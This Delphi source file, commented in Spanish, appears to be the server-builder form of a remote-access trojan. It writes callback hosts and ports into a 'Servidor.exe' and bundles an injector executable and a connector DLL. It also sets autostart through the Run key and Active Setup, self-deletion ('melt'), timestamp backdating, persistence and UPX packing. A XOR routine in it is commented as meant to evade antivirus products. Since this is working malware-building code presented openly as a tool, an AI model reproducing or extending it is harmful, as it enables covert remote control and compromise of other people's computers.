unit UnitFormConfigServer;

interface

uses
  Windows, SysUtils, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons,
  SettingsDef, {Esta es la unidad para leer la configuracion}
  ExtCtrls, ComCtrls,
  gnugettext, ImgList;

type
  TFormConfigServer = class(TForm)
    StatusBar: TStatusBar;
    OpenDialog: TOpenDialog;
    PageControl: TPageControl;
    TabConexion: TTabSheet;
    TabInstalacion: TTabSheet;
    TabOpciones: TTabSheet;
    TabCrear: TTabSheet;
    MemoOutput: TMemo;
    lbl2: TLabel;
    listviewconexionesconfig: TListView;
    btn3: TSpeedButton;
    btn2: TSpeedButton;
    btn1: TSpeedButton;
    btn4: TSpeedButton;
    CheckBoxCopiar: TCheckBox;
    Label6: TLabel;
    EditFileName: TEdit;
    CheckBoxMelt: TCheckBox;
    CheckBoxCopiarConFechaAnterior: TCheckBox;
    CheckBoxRun: TCheckBox;
    CheckBoxActiveSetup: TCheckBox;
    CheckBoxUPX: TCheckBox;
    CheckBoxCifrar: TCheckBox;
    btnBtnGuardarConfig: TSpeedButton;
    btnBtnSalir: TSpeedButton;
    CheckBoxInyectar: TCheckBox;
    CheckBoxPersistencia: TCheckBox;
    CheckBoxEscribirADisco: TCheckBox;
    EditCopyTo: TEdit;
    EditRunName: TEdit;
    EditActiveSetup: TEdit;
    EditPluginName: TEdit;
    EditID: TEdit;
    EditIP: TEdit;
    EditPuerto: TEdit;
    Label4: TLabel;
    Label15: TLabel;
    Label7: TLabel;
    Label1: TLabel;
    Label3: TLabel;
    SpeedButtonSiguiente: TSpeedButton;
    SpeedButtonAnterior: TSpeedButton;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    SpeedButton5: TSpeedButton;
    ImageList: TImageList;
    procedure FormShow(Sender: TObject);
    procedure btnBtnGuardarConfigClick(Sender: TObject);
    procedure btnBtnSalirClick(Sender: TObject);
    procedure EditPuertoKeyPress(Sender: TObject; var Key: char);
    procedure EditIPKeyPress(Sender: TObject; var Key: char);
    procedure CheckBoxCopiarClick(Sender: TObject);
    procedure CheckBoxRunClick(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure CheckBoxInyectarClick(Sender: TObject);
    procedure EditActiveSetupClick(Sender: TObject);
    procedure CheckBoxActiveSetupClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure SpeedButtonSiguienteClick(Sender: TObject);
    procedure SpeedButtonAnteriorClick(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure SpeedButton5Click(Sender: TObject);
  private
    { Private declarations }
    IconPath: string;
    function ComprobarDatosValidos(): Boolean;
  public
    { Public declarations }
    Ipsypuertos: string; //localhost:81¬google.com:77¬
  end;

var
  FormConfigServer: TFormConfigServer;

implementation

uses UnitOpciones;

{$R *.dfm}

procedure TFormConfigServer.FormShow(Sender: TObject);
var
  tmpstr, tmpstr2: string;
  item: Tlistitem;
begin
  FormConfigServer.ShowHint := Formopciones.CheckboxAyuda3.Checked;
  PageControl.ActivePageIndex := 0;
  //StatusBar.Panels[0].Text := _('Seleccione el servidor que desea modificar.');
  IconPath := '';
  MemoOutput.Clear;
  MemoOutput.Lines.Append(_('> Listo.'));
  CheckBoxCopiarClick(Sender); //Para que desactive o active los campos
  CheckBoxRunClick(Sender); //Para que desactive o active los campos
  CheckBoxInyectarClick(Sender); //Para que desactive o active los campos
  CheckBoxActiveSetupClick(Sender); //Para que desactive o active los campos

  tmpstr := ipsypuertos; //Cargamos los hosts y los puertos al listview
  listviewconexionesconfig.Clear;
  while (Pos('¬', tmpstr) > 0) do
    begin
      tmpstr2 := Copy(tmpstr, 1, Pos('¬', tmpstr) - 1);
      Delete(tmpstr, 1, Pos('¬', tmpstr));
      item := listviewconexionesconfig.Items.Add;
      item.Caption := Copy(tmpstr2, 1, Pos(':', tmpstr2) - 1);
      Delete(tmpstr2, 1, Pos(':', tmpstr2));
      item.SubItems.Add(tmpstr2);
    end;
end;

//Función para comprobar que todos los datos son validos

function TFormConfigServer.ComprobarDatosValidos(): Boolean;
var
  s: string;
begin
  Result := True;

  { //Comprobamos que sean correctos los datos del EditTimeToNotify
   if (StrToIntDef(EditTimeToNotify.Text, -1) = -1) or
     (StrToInt(EditTimeToNotify.Text) < 1) then
   begin
     StatusBar.Panels[0].Text :=
       '"Intentar conectar cada" debe ser un valor númerico superior a 0';
     MessageBeep($FFFFFFFF);
     //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
     EditTimeToNotify.SetFocus;
     Result := False;
     exit;
   end;         }
   //comprobamos que sea correcto el nombre para copiar
  if (EditPluginName.Text = '') and (CheckBoxEscribirADisco.Checked) then
    begin
      MessageBeep($FFFFFFFF);
      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
      EditPluginName.SetFocus;
      PageControl.ActivePage := TabOpciones;
      Result := False;
      StatusBar.Panels[0].Text :=
        _('Tienes que establecer un nombre al plugin');

      Exit;
    end;
  if(CheckBoxEscribirADisco.Checked) then
  begin
    s := EditPluginName.Text;
    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
    (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
    (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      StatusBar.Panels[0].Text :=
        _('Nombre del plugin inválido. No puede tener ninguno de los siguientes carácteres:') + ' */?"<>|';
      MessageBeep($FFFFFFFF);
      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
      EditCopyTo.SetFocus;
      Result := False;
      Exit;
    end;
  end;

  if EditCopyTo.Text[Length(EditCopyTo.Text)] <> '\' then
    EditCopyTo.Text := EditCopyTo.Text + '\';
  s := EditCopyTo.Text;
  if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
    (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
    (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      StatusBar.Panels[0].Text :=
        _('Ruta inválida. No puede tener ninguno de los siguientes carácteres:') + ' */?"<>|';
      MessageBeep($FFFFFFFF);
      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
      EditCopyTo.SetFocus;
      Pagecontrol.ActivePage := TabInstalacion;
      Result := False;
      Exit;
    end;
end;


function leerarchivo(f: string): string;
var
  ServerFile: file;
  Tamano: Integer;
begin
  FileMode := fmopenread;
  AssignFile(ServerFile, f); //archivo de CoolServer
  Reset(ServerFile, 1);
  tamano := FileSize(ServerFile);
  SetLength(Result, tamano);
  BlockRead(ServerFile, Result[1], tamano); //cargado archivo a servdll
  CloseFile(ServerFile);
end;

procedure borrararchivo(s: string);
begin
  if (fileexists(s)) then
    deletefile(s);
end;

function cifrar(Text: AnsiString; i: Integer): AnsiString;
var
  iloop: Integer;
begin
  for iloop := 1 to Length(Text) do
    Text[iloop] := chr(Ord(Text[iloop]) xor i); //funcion de cifrado simple para evadir antiviruses
  Result := Text;
end;

procedure FinalizarInstalacion(exito: Boolean);
begin
  borrararchivo(extractfiledir(ParamStr(0)) + '\~jeringa.exe');
  borrararchivo(extractfiledir(ParamStr(0)) + '\~monitor.dll');
  borrararchivo(extractfiledir(ParamStr(0)) + '\~conectador.dll');
  if not exito then
    borrararchivo(extractfiledir(ParamStr(0)) + '\' + _('Servidor.exe'));
end;

procedure TFormConfigServer.btnBtnGuardarConfigClick(Sender: TObject);
var
  ConfigToSave: PSettings;
  Servidor: string;
  i: Integer;
  num: Integer;
  num2: Integer;
  monitor: string;
  conectador: string;
  StartInfo: TStartupInfo; //Para esperar a que finalice upx.exe
  ProcInfo: TProcessInformation;
begin
  finalizarinstalacion(True); //Para borrar los archivos de alguna otra instalacion si existiesen
  Servidor := extractfiledir(ParamStr(0)) + '\' + _('Servidor.exe');
  Randomize;
  if checkboxcifrar.Checked then
    begin
      num := Random(250); //numero para cifrar los recursos

      num2 := Random(250); //numero2 para cifrar los recursos
      while num = num2 do //poco probable :p
        num2 := Random(250);
    end
  else
    begin
      num := 0; //  numero XOR 0 = numero
      num2 := 0; //  numero XOR 0 = numero
    end;
  if ComprobarDatosValidos() then
    begin
      //Primero copiamos los archivos necesarios
      MemoOutput.Lines.Append(_('> Copiando los archivos necesarios...'));

      if CheckBoxInyectar.Checked then //con inyección
        begin

          if (fileexists(extractfiledir(ParamStr(0)) + '\Recursos\Jeringa.exe')) then
            CopyFile(PChar(extractfiledir(ParamStr(0)) + '\Recursos\Jeringa.exe'), PChar(Servidor), False)
          else
            begin
              StatusBar.Panels[0].Text := _('El archivo Jeringa.exe no existe');
              MemoOutput.Lines.Append(_('> Error: El archivo Jeringa.exe no existe'));
              Exit;
            end;
          MemoOutput.Lines.Append(_('> Jeringa.exe correctamente copiado.'));

          if (fileexists(extractfiledir(ParamStr(0)) + '\Recursos\conectador.dll')) then
            CopyFile(PChar(extractfiledir(ParamStr(0)) + '\Recursos\conectador.dll'), PChar(extractfiledir(ParamStr(0)) + '\~conectador.dll'), False)
          else
            begin
              FinalizarInstalacion(False);
              StatusBar.Panels[0].Text := _('El archivo Conectador.dll no existe.');
              MemoOutput.Lines.Append(_('> Error: El archivo Conectador.dll no existe.'));
              Exit;
            end;
          MemoOutput.Lines.Append(_('> Conectador.dll correctamente copiado.'));

          if (CheckBoxUPX.Checked) then
            begin
              MemoOutput.Lines.Append(_('Comprimiendo conectador.dll con UPX...'));
              FillChar(StartInfo, SizeOf(StartInfo), 0);
              StartInfo.cb := SizeOf(StartInfo);

              CreateProcess(PChar(extractfiledir(ParamStr(0)) + '\Recursos\upx.exe'), PChar(' ' + extractfiledir(ParamStr(0)) + '\~conectador.dll'), nil, nil, False, 0, nil, nil, StartInfo, ProcInfo);
              WaitForSingleObject(ProcInfo.hProcess, INFINITE); //Esperamos a que acabe
              MemoOutput.Lines.Append(_('Comprimidos!'));
            end;

          conectador := cifrar(cifrar(leerarchivo(extractfiledir(ParamStr(0)) + '\~conectador.dll'), num), num2);

        end
      else
        begin //sin inyección
          if (fileexists(extractfiledir(ParamStr(0)) + '\Recursos\conectador.exe')) then
            CopyFile(PChar(extractfiledir(ParamStr(0)) + '\Recursos\conectador.exe'), PChar(Servidor), False)
          else
            begin
              StatusBar.Panels[0].Text := _('El archivo conectador.exe no existe.');
              MemoOutput.Lines.Append(_('> Error: El archivo conectador.exe no existe.'));
              Exit;
            end;
          MemoOutput.Lines.Append(_('> Conectador.exe correctamente copiado.'));
        end;

      if (checkboxinyectar.Checked) then
        begin
          MemoOutput.Lines.Append(_('> Conectador.dll añadida') + ' => +(' + IntToStr(Length(conectador)) + ')');
          MemoOutput.Lines.Append(_('> Escribiendo la configuración al servidor...'));
        end
      else
        MemoOutput.Lines.Append(_('> Escribiendo la configuración al servidor...'));
      New(ConfigToSave);
      ConfigToSave.sHosts := '';
      for i := 0 to ListViewConexionesConfig.Items.Count - 1 do
        if (ListViewConexionesConfig.Items[i] <> nil) then //creamos la lista de hosts
          ConfigToSave.sHosts := ConfigToSave.sHosts + ListViewConexionesConfig.Items[i].Caption + ':' + ListViewConexionesConfig.Items[i].SubItems[0] + '¬';
      ConfigToSave.sID := EditID.Text;
      if(CheckBoxEscribirADisco.Checked) then
        ConfigToSave.sPluginName := EditPluginName.Text
      else
        ConfigToSave.sPluginName := 'NOESCRIBIRADISCO';
      ConfigToSave.bCopiarArchivo := CheckBoxCopiar.Checked;
      ConfigToSave.sFileNameToCopy := EditFileName.Text;
      ConfigToSave.sCopyTo := EditCopyTo.Text;
      ConfigToSave.bMelt := CheckBoxMelt.Checked;
      ConfigToSave.bArranqueRun := CheckBoxRun.Checked;
      ConfigToSave.sRunRegKeyName := EditRunName.Text;
      ConfigToSave.bCopiarConFechaAnterior := CheckBoxCopiarConFechaAnterior.Checked;
      ConfigToSave.sActiveSetupKeyName := EditActiveSetup.Text;
      ConfigToSave.bArranqueActiveSetup := CheckBoxActiveSetup.Checked;
      ConfigToSave.snumerocifrado := IntToStr(num);
      ConfigToSave.snumerocifrado2 := IntToStr(num2);
      ConfigToSave.bPersistencia := CheckboxPersistencia.Checked;
      if WriteSettings(PChar(Servidor), ConfigToSave, conectador) = True then
        begin
          StatusBar.Panels[0].Text := _('La configuración se guardó con éxito.');
          MemoOutput.Lines.Append(_('> La configuración se guardó con éxito.'));
          FinalizarInstalacion(True);
        end
      else
        begin
          MessageBeep($FFFFFFFF);
          StatusBar.Panels[0].Text := _('No se pudo guardar la configuración.');
          MemoOutput.Lines.Append(_('> No se pudo guardar la configuración.'));
          // FinalizarInstalacion(false);
        end;
      Dispose(ConfigToSave); //Libera la configuracion
      if IconPath <> '' then //cambiar icono
        begin
          MemoOutput.Lines.Append(_('> Cambiando el icono al servidor...'));
        end;
    end;
end;

procedure TFormConfigServer.btnBtnSalirClick(Sender: TObject);
begin
  Close;
end;

//Solo permite que se escriban números en el Edit

procedure TFormConfigServer.EditPuertoKeyPress(Sender: TObject; var Key: char);
begin
  if not (key in ['0'..'9', #8]) then
    begin
      key := #0;
      StatusBar.Panels[0].Text := _('Este campo solo admite números');
      MessageBeep($FFFFFFFF);
    end;
end;

procedure TFormConfigServer.EditIPKeyPress(Sender: TObject; var Key: char);
begin
  if key = '|' then
    begin
      key := #0;
      StatusBar.Panels[0].Text := _('Este campo no admite el caracter: |');
      MessageBeep($FFFFFFFF);
    end;
end;

//Por si pega un texto sobre puerto o en TimeToNotify

procedure TFormConfigServer.CheckBoxCopiarClick(Sender: TObject);
begin
  //Activa o desactiva los valores correspondientes
  EditFileName.Enabled := CheckBoxCopiar.Checked;
  EditCopyTo.Enabled := CheckBoxCopiar.Checked;
  CheckBoxMelt.Enabled := CheckBoxCopiar.Checked;
  CheckBoxCopiarConFechaAnterior.Enabled := CheckBoxCopiar.Checked;
  Label4.Enabled := CheckBoxCopiar.Checked; //nombre de archivo
  Label6.Enabled := CheckBoxCopiar.Checked;
end;

procedure TFormConfigServer.CheckBoxRunClick(Sender: TObject);
begin
  EditRunName.Enabled := CheckBoxRun.Checked;
  Label15.Enabled := CheckBoxRun.Checked; //nombre de clave
end;



procedure TFormConfigServer.btn1Click(Sender: TObject);
var
  item: Tlistitem;
  s: string;
begin

  s := EditIP.Text;
  if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
    (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
    (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      StatusBar.Panels[0].Text :=
        _('IP o DNS inválida. No puede tener ninguno de los siguientes carácteres:') + ' */?"<>|';
      MessageBeep($FFFFFFFF);
      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
      EditIP.SetFocus;
      Exit;
    end;

  if ((EditIp.Text = '') or (EditPuerto.Text = '')) then
    Exit;

  if (not ((StrToIntDef(EditPuerto.Text, -1) > 0) or (StrToIntDef(EditPuerto.Text, -1) < 65555))) then
    Exit;
  item := ListViewConexionesConfig.Items.Add;
  item.Caption := EditIp.Text;
  item.SubItems.Add(EditPuerto.Text);
  EditIp.Text := '';
  EditPuerto.Text := '';
end;

procedure TFormConfigServer.btn4Click(Sender: TObject);
begin
  if listviewconexionesconfig.Selected <> nil then
    listviewconexionesconfig.Selected.Delete;
end;

procedure TFormConfigServer.btn2Click(Sender: TObject);
var
  i: Integer;
  value1, value2: string;
begin
  if listviewconexionesconfig.Selected <> nil then
    begin
      i := listviewconexionesconfig.Selected.Index;
      value1 := listviewconexionesconfig.Selected.Caption;
      value2 := listviewconexionesconfig.Selected.SubItems[0];
      if i <> 0 then
        begin
          listviewconexionesconfig.selected.Caption := listviewconexionesconfig.Items.Item[i - 1].Caption;
          listviewconexionesconfig.Selected.SubItems[0] := listviewconexionesconfig.Items.Item[i - 1].SubItems[0];
          listviewconexionesconfig.Items.Item[i - 1].Caption := value1;
          listviewconexionesconfig.Items.Item[i - 1].SubItems[0] := value2;
          listviewconexionesconfig.Items.Item[i - 1].Selected := True;

        end;
    end;
end;

procedure TFormConfigServer.btn3Click(Sender: TObject);
var
  i: Integer;
  value1, value2: string;
begin
  if listviewconexionesconfig.Selected <> nil then
    begin
      i := listviewconexionesconfig.Selected.Index;
      value1 := listviewconexionesconfig.Selected.Caption;
      value2 := listviewconexionesconfig.Selected.SubItems[0];
      if i <> listviewconexionesconfig.Items.Count - 1 then
        begin
          listviewconexionesconfig.selected.Caption := listviewconexionesconfig.Items.Item[i + 1].Caption;
          listviewconexionesconfig.Selected.SubItems[0] := listviewconexionesconfig.Items.Item[i + 1].SubItems[0];
          listviewconexionesconfig.Items.Item[i + 1].Caption := value1;
          listviewconexionesconfig.Items.Item[i + 1].selected := True;
          listviewconexionesconfig.Items.Item[i + 1].SubItems[0] := value2;
        end;
    end;
end;

procedure TFormConfigServer.CheckBoxInyectarClick(Sender: TObject);
begin
  checkboxpersistencia.Enabled := Checkboxinyectar.Checked;
  checkboxupx.Enabled := Checkboxinyectar.Checked;
  checkboxcifrar.Enabled := Checkboxinyectar.Checked;
end;

procedure TFormConfigServer.EditActiveSetupClick(Sender: TObject);
const
  caracteres = '1234567890ABCDEF';
var
  clave: string;
  caracter: string;
  i, o: Integer;
begin
  //Estilo: {1BD81F78-FDC7-FE07-3BEF-78ED6B103A24}
  clave := '{';

  for i := 0 to 7 do
    begin
      Randomize; //no es muy necesario pero bueno...
      caracter := caracteres[Random(Length(caracteres)) + 1];
      clave := clave + caracter;
    end;
  clave := clave + '-';

  for o := 0 to 2 do
    begin
      for i := 0 to 3 do
        begin
          Randomize; //no es muy necesario pero bueno...
          caracter := caracteres[Random(Length(caracteres)) + 1];
          clave := clave + caracter;
        end;
      clave := clave + '-';
    end;

  for i := 0 to 11 do
    begin
      Randomize; //no es muy necesario pero bueno...
      caracter := caracteres[Random(Length(caracteres)) + 1];
      clave := clave + caracter;
    end;

  clave := clave + '}';
  editactivesetup.Text := clave;
end;

procedure TFormConfigServer.CheckBoxActiveSetupClick(Sender: TObject);
begin
  EditActiveSetup.Enabled := CheckBoxActiveSetup.Checked;
  Label7.Enabled := CheckBoxActiveSetup.Checked;
end;

procedure TFormConfigServer.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  i: Integer;
begin
  ipsypuertos := '';
  for i := 0 to ListViewConexionesConfig.Items.Count - 1 do
    begin
      if (ListViewConexionesConfig.Items[i] <> nil) then
        ipsypuertos := ipsypuertos + ListViewConexionesConfig.Items[i].Caption + ':' + ListViewConexionesConfig.Items[i].SubItems[0] + '¬';
    end;
end;
procedure TFormConfigServer.SpeedButtonSiguienteClick(Sender: TObject);
begin
  PageControl.ActivePageIndex := 1;
end;

procedure TFormConfigServer.SpeedButtonAnteriorClick(Sender: TObject);
begin
  PageControl.ActivePageIndex := 0;
end;

procedure TFormConfigServer.SpeedButton1Click(Sender: TObject);
begin
  PageControl.ActivePageIndex := 2;
end;

procedure TFormConfigServer.SpeedButton2Click(Sender: TObject);
begin
  PageControl.ActivePageIndex := 1;
end;

procedure TFormConfigServer.SpeedButton3Click(Sender: TObject);
begin
  PageControl.ActivePageIndex := 3;
end;

procedure TFormConfigServer.SpeedButton5Click(Sender: TObject);
begin
  PageControl.ActivePageIndex := 2;
end;

end.
